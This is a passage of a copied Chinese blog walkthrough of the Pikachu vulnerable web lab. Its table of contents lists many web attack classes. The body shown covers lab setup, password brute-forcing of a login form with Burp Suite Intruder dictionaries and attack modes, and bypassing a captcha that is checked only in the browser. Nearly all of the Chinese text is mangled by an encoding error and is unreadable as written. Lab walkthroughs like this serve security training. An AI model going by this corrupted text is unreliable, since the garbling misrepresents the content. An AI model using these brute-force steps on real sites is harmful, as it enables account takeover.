---
date: 2022-06-30-æ˜ŸæœŸå›› 20:35:24
update: 
tags: [time/year2022,time/month06]
id: 20220630203524
---
# pikachué¶åœºé€šå…³

[blog.csdn.net](https://blog.csdn.net/qq_53571321/article/details/121692906)

### pikachué¶åœºé€šå…³è¯¦è§£

*   ä¸€ã€é¶åœºä»‹ç»
*   äºŒã€é¶åœºé…ç½®
*   ä¸‰ã€é¶åœºå®æˆ˜
*   *   3.1 æš´åŠ›ç ´è§£æ¼æ´
    *   *   3.1.1æš´åŠ›ç ´è§£æ”»å‡»&æš´åŠ›ç ´è§£æ¼æ´æ¦‚è¿°
        *   3.1.2æš´åŠ›ç ´è§£æ¼æ´æµ‹è¯•æµç¨‹
        *   3.1.3åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£æ”»å‡»(åŸºäºburp suite )
        *   3.1.4æš´åŠ›ç ´è§£ä¹‹ä¸å®‰å…¨çš„éªŒè¯ç åˆ†æ---on client---on server
        *   3.1.5Tokenå¯ä»¥é˜²æš´åŠ›ç ´è§£å—?
        *   3.1.6æš´åŠ›ç ´è§£å¸¸è§çš„é˜²èŒƒæªæ–½
    *   3.2 XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´ï¼‰
    *   *   3.2.1è·¨ç«™è„šæœ¬æ¼æ´æ¦‚è¿°
        *   3.2.2è·¨ç«™è„šæœ¬æ¼æ´ç±»å‹åŠæµ‹è¯•æµç¨‹
        *   3.2.3åå°„å‹XSS ( get&post )æ¼”ç¤º
        *   3.2.4å­˜å‚¨å‹XSSæ¼”ç¤º
        *   3.2.5Domå‹XSSæ¼”ç¤º
        *   3.2.6XSSç›²æ‰“æ¼”ç¤ºå’ŒåŸç†åˆ†æ
        *   3.2.7XSSçš„è¿‡æ»¤å’Œç»•è¿‡( filter&htmlspecialchars )
        *   3.2.8XSSè¾“å‡ºåœ¨hrefå’Œjsä¸­çš„æ¡ˆä¾‹åˆ†æ
        *   3.2.9XSSçš„å±å®³-è·å–cookieçš„åŸç†å’Œæ¼”ç¤º
        *   3.2.10XSSå±å®³-XSSè¿›è¡Œé’“é±¼çš„åŸç†å’Œæ¼”ç¤º
        *   3.2.11XSSå±å®³XSSè·å–é”®ç›˜è®°å½•åŸç†å’Œæ¼”ç¤º
        *   3.2.12XSSå¸¸è§é˜²èŒƒæªæ–½
    *   3.3CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´ï¼‰
    *   *   3.3.1CSRFæ¼æ´æ¦‚è¿°
        *   3.3.2CSRF ( get/post )å®éªŒæ¼”ç¤ºå’Œè§£æ
        *   3.3.3Anti CSRF token
        *   3.3.4å¸¸è§CSRFé˜²èŒƒæªæ–½
    *   3.4SQL-Injectï¼ˆSQLæ³¨å…¥æ¼æ´ï¼‰
    *   *   3.4.1SQL Injectæ¼æ´åŸç†æ¦‚è¿°
        *   3.4.2æ³¨å…¥æ–¹å¼get&post&æœç´¢å‹&xxå‹
        *   3.4.3SQL Injectæ¼æ´æ‰‹å·¥æµ‹è¯•:åŸºäºunionè”åˆæŸ¥è¯¢çš„ä¿¡æ¯è·å–( select )
        *   3.4.4é€šè¿‡information\_ schemaæ‹¿ä¸‹æ•°æ®åº“æ‰‹å·¥æµ‹è¯•å®Œæ•´æ¡ˆä¾‹æ¼”ç¤º
        *   3.4.5SQL Injectæ¼æ´æ‰‹å·¥æµ‹è¯•:åŸºäºæŠ¥é”™çš„ä¿¡æ¯è·å–(select/delete/update/insert)
        *   3.4.6SQLæ³¨å…¥æ¼æ´-åŸºäºhttp headerçš„æ³¨å…¥
        *   3.4.7SQLæ³¨å…¥æ¼æ´-ç›²æ³¨( boolian base )åŸç†åŠæµ‹è¯•
        *   3.4.8SQLæ³¨å…¥æ¼æ´ç›²æ³¨( time base )åŸç†åŠæµ‹è¯•
        *   3.4.9osè¿œç¨‹æ§åˆ¶
        *   3.4.10SQL Injectæ¼æ´ä¹‹è¡¨(åˆ—)åçš„æš´åŠ›ç ´è§£
        *   3.4.11å¦‚ä½•ä½¿ç”¨SQL-Mapè¿›è¡ŒSQL Injectæ¼æ´æµ‹è¯•
        *   3.4.12SQLæ³¨å…¥æ¼æ´å¸¸è§é˜²èŒƒæªæ–½
    *   3.5RCEï¼ˆä»£ç æ‰§è¡Œ/å‘½ä»¤æ‰§è¡Œï¼‰
    *   3.6Files Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)
    *   *   3.6.1æ–‡ä»¶åŒ…å«åŸç†åŠæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´
        *   3.6.2è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´
        *   3.6.3æ–‡ä»¶åŒ…å«æ¼æ´é˜²èŒƒæªæ–½
    *   3.7 Unsafe file downloads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½)
    *   3.8 Unsafe file uploads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ )
    *   *   3.8.1ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ åŸç†åŠå®¢æˆ·ç«¯ç»•è¿‡
        *   3.8.2ä¸Šä¼ æ¼æ´ä¹‹MINE typeéªŒè¯åŸç†å’Œç»•è¿‡
        *   3.8.3æ–‡ä»¶ä¸Šä¼ ä¹‹getimagesizeç»•è¿‡å’Œé˜²èŒƒæªæ–½
    *   3.9 Over Permisson(è¶Šæƒæ¼æ´)
    *   *   3.9.1è¶Šæƒæ¼æ´åŸç†åŠæ°´å¹³è¶Šæƒ
        *   3.9.2å‚ç›´è¶Šæƒ
    *   3.10 ../../../(ç›®å½•éå†)
    *   3.11 I can see your ABC(æ•æ„Ÿä¿¡æ¯æ³„éœ²)
    *   3.12 PHPååºåˆ—åŒ–æ¼æ´
    *   3.13 XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ”»å‡»ï¼‰
    *   3.14 ä¸å®‰å…¨çš„URLé‡å®šå‘
    *   3.15 SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰
*   å‚è€ƒèµ„æ–™

# ä¸€ã€é¶åœºä»‹ç»

é¶åœºæºç é“¾æ¥ï¼š-
GitHubï¼šhttps://github.com/zhuifengshaonianhanlu/pikachu-
é¶åœºæ¼æ´ä»‹ç»ï¼š-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdac27dbad24d4f3b83d44f19b25ffece.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

# äºŒã€é¶åœºé…ç½®

å…ˆå®‰è£…phpstudeyï¼Œåœ¨GitHubä¸Šä¸‹è½½æºç ï¼Œæ”¾åœ¨phpstudyçš„wwwï¼ˆç½‘ç«™ï¼‰ç›®å½•ä¸‹ï¼Œå®Œæˆé…ç½®ä¸åˆå§‹åŒ–ã€‚-
é¶åœºæ­å»ºé“¾æ¥ï¼ˆå†…å«phpstudyä¸pikachuçš„é…ç½®ï¼‰ï¼š-
[https://blog.csdn.net/weixin\_42474304/article/details/117533788](https://blog.csdn.net/weixin_42474304/article/details/117533788)

# ä¸‰ã€é¶åœºå®æˆ˜

## 3.1 æš´åŠ›ç ´è§£æ¼æ´

#### 3.1.1æš´åŠ›ç ´è§£æ”»å‡»&æš´åŠ›ç ´è§£æ¼æ´æ¦‚è¿°

å¯¹æš´åŠ›ç ´è§£çš„ç†è§£ï¼š==æš´åŠ›ç ´è§£=è¿ç»­æ€§çš„å°è¯•+å­—å…¸+è‡ªåŠ¨åŒ–==ã€‚-
å…¶å®å°±æ˜¯å»<span style="background:#ffff00">çŒœ</span>å¯èƒ½çš„<span style="background:#ffff00">å¯†ç </span>ï¼Œç»è¿‡ä¸æ–­çš„è¯•è´¦å·å’Œå¯†ç ï¼Œæ‰¾å‡ºæ­£ç¡®çš„è´¦å·å¯†ç ï¼Œè¾¾åˆ°æš´åŠ›ç ´è§£çš„ç›®çš„ã€‚-
<span style="background:#ffff00">æœ€é‡è¦</span>çš„éƒ¨åˆ†å°±æ˜¯<span style="background:#ffff00">å­—å…¸</span>ï¼Œä¸€ä¸ªå¥½çš„å­—å…¸å¯ä»¥å¤§å¤§åŠ å¿«ç ´è§£é€Ÿåº¦ã€‚

*   å¸¸ç”¨çš„è´¦å·å¯†ç ï¼ˆ<span style="background:#ffff00">å¼±å£ä»¤</span>ï¼‰ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„è´¦å·å¯†ç ï¼Œç³»ç»Ÿåˆå§‹è®¾å®šçš„è´¦å·å¯†ç ï¼Œæ¯”å¦‚å¸¸ç”¨<span style="background:#ffff00">ç”¨æˆ·å/å¯†ç TOP 500</span>ç­‰ã€‚
*   äº’è”ç½‘ä¸Šè¢«è„±è£¤åè´¦å·å¯†ç (<span style="background:#ffff00">ç¤¾å·¥åº“</span>) ,å·®ä¸å¤šå°±æ˜¯<span style="background:#ffff00">æ’åº“</span>ï¼Œä¹Ÿå°±æ˜¯æ‹¿å·²çŸ¥çš„ä¸€ä¸ªåº“å»å°è¯•ç™»å½•å¦å¤–ä¸€ä¸ªåº“ã€‚æ¯”å¦‚CSDNå½“å¹´æ³„æ¼çš„çº¦600wç”¨æˆ·ä¿¡æ¯ã€‚
*   ä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦ä½¿ç”¨å·¥å…·æŒ‰ç…§æŒ‡å®šçš„è§„åˆ™è¿›è¡Œæ’åˆ—ç»„åˆç®—æ³•ç”Ÿæˆçš„å¯†ç ï¼Œç‰¹å®šçš„å­—ç¬¦å¾ˆå¤šï¼Œåƒæ‰‹æœºå·ã€å‡ºç”Ÿæ—¥æœŸï¼Œå§“åç­‰ç­‰ã€‚

å¯¹äºæš´åŠ›ç ´è§£æ¼æ´çš„è¯ï¼Œå¦‚æœä¸ªç½‘ç«™æ²¡æœ‰å¯¹ç™»å½•æ¥ å®æ–½é˜²æš´åŠ›ç ´è§£çš„æªæ–½ï¼Œæˆ–è€…å®æ–½ äº†ä¸åˆç†çš„æªæ–½ï¼Œç§°è¯¥ç½‘ç«™å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ã€‚-
âœ“æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®äº†<span style="background:#ffff00">å¤æ‚çš„å¯†ç </span>;-
âœ“æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„<span style="background:#ffff00">éªŒè¯ç ;</span>-
âœ“æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œ<span style="background:#ffff00">åˆ¤æ–­å’Œé™åˆ¶</span>;-
âœ“æ˜¯å¦åœ¨å¿…è¦çš„æƒ…å†µä¸‹é‡‡ç”¨äº†<span style="background:#ffff00">åŒå› ç´ è®¤è¯</span>;-
â€¦ç­‰ç­‰ã€‚-
å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´çš„ç½‘ç«™å¯èƒ½ä¼šé­å—æš´åŠ›ç ´è§£æ”»å‡»ï¼Œä½†è¯¥æš´åŠ›ç ´è§£æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§å¹¶ä¸æ˜¯100% !-
æ‰€ä»¥æœ‰äº›ç½‘ç«™å³è™½ç„¶å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä½†å…¶ç®¡ç†å‘˜å¯èƒ½ä¼šå¿½ç•¥å®ƒçš„å±å®³ã€‚æå®‰å…¨çš„è¯ï¼Œä¸èƒ½æœ‰ä¾¥å¹¸å¿ƒç†ï¼Œå¦åˆ™éšæ—¶ä¼šè¢«å¹²æ‰ğŸ˜­ã€‚

#### 3.1.2æš´åŠ›ç ´è§£æ¼æ´æµ‹è¯•æµç¨‹

1ã€ç¡®è®¤<span style="background:#ffff00">æ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ </span>ï¼š-
ç¡®è®¤ç›®æ ‡æ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£çš„æ¼æ´ã€‚( ç¡®è®¤è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§" ï¼‰-
æ¯”å¦‚:å°è¯•ç™»å½•ä¸€æŠ“åŒ…-- -è§‚å¯ŸéªŒè¯å…ƒç´ å’Œresponseä¿¡æ¯,åˆ¤æ–­å¦å­˜åœ¨è¢«æš´åŠ›ç ´è§£çš„å¯èƒ½ã€‚-
2ã€å¯¹<span style="background:#ffff00">å­—å…¸è¿›è¡Œé…ç½®</span>-
æ ¹æ®å®é™…çš„æƒ…å†µå¯¹å­—å…¸è¿›è¡Œé…ç½®ï¼Œæé«˜çˆ†ç ´è¿‡ç¨‹çš„æ•ˆç‡ã€‚-
æŠ€å·§ä¸€:-
<span style="background:#ffff00">æ ¹æ®æ³¨å†Œæç¤ºä¿¡æ¯è¿›è¡Œä¼˜åŒ–</span>-
å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œæ³¨å†Œï¼Œææ¸…æ¥šè´¦å·å¯†ç çš„ä¸€äº›é™åˆ¶ï¼Œæ¯”å¦‚ç›®æ ‡ç«™ç‚¹è¦æ±‚å¯†ç å¿…é¡»æ˜¯6ä½ä»¥ä¸Šï¼Œå­—æ¯æ•°å­—ç»„åˆï¼Œåˆ™å¯ä»¥æŒ‰ç…§æ­¤ä¼˜åŒ–å­—å…¸,æ¯”å¦‚å»æ‰ä¸ç¬¦åˆè¦æ±‚çš„å¯†ç ã€‚-
æŠ€å·§äºŒ:-
å¦‚æœçˆ†ç ´çš„æ˜¯ç®¡ç†åå°ï¼Œå¾€å¾€è¿™ç§ç³»ç»Ÿçš„ç®¡ç†å‘˜æ˜¯<span style="background:#ffff00">admin/administrator/root</span>çš„æœºç‡æ¯”è¾ƒé«˜ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸‰ä¸ªè´¦å·+éšä¾¿-ä¸ªå¯†ç  ,å°è¯•ç™»å½• ,è§‚çœ‹è¿”å›çš„ç»“æœ ï¼Œç¡®å®šç”¨æˆ·åã€‚-
æ¯”å¦‚:-
è¾“å…¥xxx/yyyfè¿”å›â€œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"-
è¾“å…¥admin/yyè¿”å›"å¯†ç é”™è¯¯â€, åˆ™åŸºæœ¬å¯ä»¥ç¡®å®šç”¨æˆ·åæ˜¯admin ;-
å› æ­¤å¯ä»¥åªå¯¹å¯†ç è¿›è¡Œçˆ†ç ´å³å¯ï¼Œæé«˜æ•ˆç‡ã€‚

3ã€å·¥å…·è‡ªåŠ¨åŒ–æ“ä½œ-
é…ç½®è‡ªåŠ¨åŒ–å·¥å…·(æ¯”å¦‚çº¿ç¨‹ã€è¶…æ—¶æ—¶é—´ã€é‡è¯•æ¬¡æ•°ç­‰) , è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚

#### 3.1.3åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£æ”»å‡»(åŸºäºburp suite )

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6647b495a024457aafee654fa8b660d4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æµ‹è¯•ç›®æ ‡: Pikachu-æš´åŠ›ç ´è§£-åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£-
æµ‹è¯•å·¥å…·: burp suite free edition-intruder-
[burpå®˜æ–¹ä¸‹è½½é€šé“](https://portswigger.net/burp/download.html)-
è¿›è¡Œå°è¯•æ€§ç™»å½•ï¼Œæç¤ºç”¨æˆ·åæˆ–å¯†ç ä¸å­˜åœ¨ï¼Œç™»é™†å¤±è´¥ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd2a1e531225948b39cd236664ac81e83.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åœ¨burpçœ‹åˆ°æ˜¯ä¸€ä¸ªpostè¯·æ±‚ï¼Œè´¦å·å’Œå¯†ç åˆ†åˆ«æ˜¯1231å’Œ1234ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe57e8630784e4ebaa4c52f72e7cb7527.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åœ¨å“åº”ç•Œé¢æ­£å¸¸è¿”å›ä¸€ä¸ªç™»é™†å¤±è´¥çš„çš„ç•Œé¢ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdb35479c69b64ba1bab92e8f1c9da055.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é€‰ä¸­æ­¤æ¡postè¯·æ±‚å‘é€åˆ°Intruderä¸­-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F23852a2bd04d42bfab2ad6f07203e033.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

å°†åŸå§‹æ•°æ®åŒ…ä¸­çš„å˜é‡æ¸…é™¤ï¼Œé€‰ä¸­ç”¨æˆ·åå’Œå¯†ç ç‚¹å‡»Add$å°†å…¶è®¾ç½®ä¸ºå˜é‡ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7d8251bead5248c2a8426505da13381f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

*   Sniperæ¨¡å¼é€»è¾‘ï¼šå…ˆå°†ç¬¬ä¸€ä¸ªå˜é‡ä¹Ÿå°±æ˜¯ç”¨æˆ·åæ›¿æ¢ï¼Œç¬¬äºŒä¸ªå˜é‡ä¸åŠ¨ã€‚å½“ç¬¬ä¸€ä¸ªå˜é‡æ›¿æ¢å®Œä¹‹åï¼Œå¯¹ç¬¬äºŒä¸ªå˜é‡è¿›è¡Œä¾æ¬¡æ›¿æ¢ã€‚ç›´ç™½ä¸€ç‚¹å°±æ˜¯è¯´ä¸€ä¸ªå˜ï¼Œå¦å¤–ä¸€ä¸ªä¸å˜ï¼Œç¬¬ä¸€ä¸ªå˜å®Œï¼Œå˜ç¬¬äºŒä¸ªã€‚
*   Battering ramæ¨¡å¼é€»è¾‘ï¼šæ‰€æœ‰å˜é‡è¿›è¡ŒåŒæ—¶åŒæ ·çš„æ›¿æ¢ã€‚å°±æ˜¯è¯´ä½ å˜æˆ‘ä¹Ÿå˜ï¼Œä½ å˜ä»€ä¹ˆæˆ‘ä¹Ÿå˜ä»€ä¹ˆã€‚
*   Pitchforkæ¨¡å¼é€»è¾‘ï¼šæ‰€æœ‰å˜é‡åŒæ—¶æ›¿æ¢ï¼Œä½†æ˜¯å„è‡ªå˜é‡æ›¿æ¢å„è‡ªçš„å­—å…¸ï¼ŒåŒæ—¶è¿›è¡Œï¼Œä½†æ˜¯äº’ä¸ç›¸å¹²ã€‚æ›¿æ¢æ—¶ç¬¬ä¸€ä¸ªå˜é‡çš„ç¬¬ä¸€æ›¿æ¢å€¼å¯¹åº”ç¬¬äºŒä¸ªå˜é‡çš„ç¬¬ä¸€ä¸ªæ›¿æ¢å€¼ï¼Œä¸è¿›è¡Œæ’åˆ—ç»„åˆï¼Œå°±æ˜¯1å¯¹1ï¼Œ2å¯¹2ã€‚ä¸ä¼šå°†å¯†ç è¿›è¡Œéšæœºçš„æ’åˆ—ç»„åˆã€‚
*   Cluster bombæ¨¡å¼é€»è¾‘ï¼šä¸Pitchforkæ¨¡å¼é€»è¾‘ç±»ä¼¼ï¼Œä¸åŒç‚¹æ˜¯Cluster bombæ¨¡å¼ä¼šè¿›è¡Œéšæœºçš„æ’åˆ—ç»„åˆã€‚

åœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Cluster bombæ¨¡å¼è¿›è¡Œç ´è§£ï¼Œåœ¨Payloadsä¸­é…ç½®ç¬¬ä¸€ä¸ªå˜é‡å’Œç¬¬äºŒä¸ªå˜é‡çš„å­—å…¸ï¼Œè¿™é‡Œå¯ä»¥æ‰‹åŠ¨è¾“å…¥æ·»åŠ ï¼Œä¹Ÿå¯ä»¥åœ¨ç³»ç»Ÿä¸­æ·»åŠ å·²ç»å†™å¥½çš„å­—å…¸ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3ba02e1ea75b49ac8a0db09bf01464b8.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æ·»åŠ å­—å…¸åè¿›è¡Œæ”»å‡»ï¼Œæ ¹æ®è¿”å›æ•°æ®åŒ…çš„é•¿åº¦è¿›è¡Œåˆ¤æ–­æ˜¯å¦æˆåŠŸã€‚ä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿä¹Ÿå¯ä»¥åœ¨grep-matchä¸­åˆ é™¤åŸæœ‰å­—ç¬¦ä¸²ï¼Œæ·»åŠ username or password is not existsï¼Œburpå°±ä¼šå°†æ‰€æœ‰å«æœ‰æ­¤å­—ç¬¦ä¸²çš„æ•°æ®åŒ…flagå‡ºæ¥ã€‚æ²¡æœ‰è¢«flagå‡ºçš„æ•°æ®åŒ…åˆ™æ˜¯æˆ‘ä»¬ç ´è§£æˆåŠŸçš„æ•°æ®åŒ…ã€‚ç‚¹å‡»username or password is not existsè¿›è¡Œæ’åºï¼Œæ²¡æœ‰å‹¾é€‰çš„åˆ™è¡¨æ˜ç ´è§£æˆåŠŸï¼Œæœ‰å‹¾é€‰çš„åˆ™è¡¨æ˜ç ´è§£å¤±è´¥ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe441c5ac655041f9a8c2c1c30ab9d6fe.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç”¨ç ´è§£å‡ºçš„è´¦æˆ·å¯†ç è¿›è¡Œç™»å½•ï¼Œlogin successã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa074299ebf0248099cca96c65134281f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.1.4æš´åŠ›ç ´è§£ä¹‹ä¸å®‰å…¨çš„éªŒè¯ç åˆ†æâ€”on clientâ€”on server

éªŒè¯ç çš„ä½œç”¨ï¼š-
é˜²æ­¢ç™»å½•æš´åŠ›ç ´è§£-
é˜²æ­¢æœºå™¨æ¶æ„æ³¨å†Œ-
éªŒè¯ç å¤§æ¦‚çš„çš„è®¤è¯æµç¨‹ï¼š

*   å®¢æˆ·ç«¯requestç™»å½•é¡µé¢,åå°ç”ŸæˆéªŒè¯ç :-
    1.åå°ä½¿ç”¨ç®—æ³•ç”Ÿæˆå›¾ç‰‡,å¹¶å°†å›¾ç‰‡responseç»™å®¢æˆ·ç«¯;-
    2.åŒæ—¶å°†ç®—æ³•ç”Ÿæˆçš„å€¼å…¨å±€èµ‹å€¼å­˜åˆ°SESSIONä¸­;
*   æ ¡éªŒéªŒè¯ç :-
    1.å®¢æˆ·ç«¯å°†è®¤è¯ä¿¡æ¯å’ŒéªŒè¯ç -åŒæäº¤;-
    2.åå°å¯¹æäº¤çš„éªŒè¯ç ä¸SESSIONé‡Œé¢çš„è¿›è¡Œæ¯”è¾ƒ;
*   å®¢æˆ·ç«¯é‡æ–°åˆ·æ–°é¡µé¢,å†æ¬¡ç”Ÿæˆæ–°çš„éªŒè¯ç :-
    éªŒè¯ç ç®—æ³•ä¸­ä¸€èˆ¬åŒ…å«éšæœºå‡½æ•°,æ‰€ä»¥æ¯æ¬¡åˆ·æ–°éƒ½ä¼šæ”¹å˜;

**ä¸å®‰å…¨çš„éªŒè¯ç on clientç»•è¿‡æ¼”ç¤º**

éšæœºè¾“å…¥è´¦å·å¯†ç ï¼Œè¾“å…¥ç›¸åº”éªŒè¯ç ï¼Œåˆ©ç”¨burpæŠ“åŒ…ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F49fcc1d9ddf744b4ba307e866916c49c.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

ç™»å½•å¤±è´¥éªŒè¯ç å‘ç”Ÿå˜åŒ–ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2e74a4007d5d4bf1a11135c183177a46.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°éªŒè¯ç æ˜¯JavaScriptéšæœºç”Ÿæˆï¼Œç‚¹å‡»ä¸€æ¬¡å‡½æ•°è¿è¡Œä¸€æ¬¡ç”Ÿæˆä¸€ä¸ªç›¸åº”çš„éªŒè¯ç ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd82cae7b36bb4b07923cf7eb5e475586.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å°†æ•°æ®åŒ…å‘é€åˆ°repeaterä¸­ï¼Œå¯¹éªŒè¯ç è¿›è¡Œåˆ¤å®šï¼Œåˆ¤å®šåå°æ˜¯å¦å¯¹éªŒè¯ç è¿›è¡Œæ ¡éªŒã€‚ä¿®æ”¹éªŒè¯ç ç‚¹å‡»go,å¤šæ¬¡å°è¯•å‘ç°è¿”å›çš„ä¿¡æ¯éƒ½æ˜¯username or password is not existsï¼Œä½†æ˜¯æ²¡æœ‰æç¤ºéªŒè¯ç é”™è¯¯ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6c1142f254124559bec46285ba16fb13.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åˆ™å¯ä»¥åˆ¤æ–­è™½ç„¶éªŒè¯ç è¢«æäº¤ï¼Œä½†æ˜¯åå°å¹¶æ²¡æœ‰éªŒè¯ã€‚è¿™ä¸ªéªŒè¯ç æ¡†æ˜¯é€šè¿‡JavaScriptå®ç°çš„ï¼Œå¯¹äºä¸æ‡‚å®‰å…¨çš„äººæ¥è¯´ï¼Œå¯ä»¥èµ·åˆ°ä¸€å®šçš„é˜²èŒƒä½œç”¨ã€‚ä½†å¯¹äºçŸ¥é“è¿™ä¸ªåŸç†çš„äººæ¥è¯´å½¢åŒè™šè®¾ã€‚-
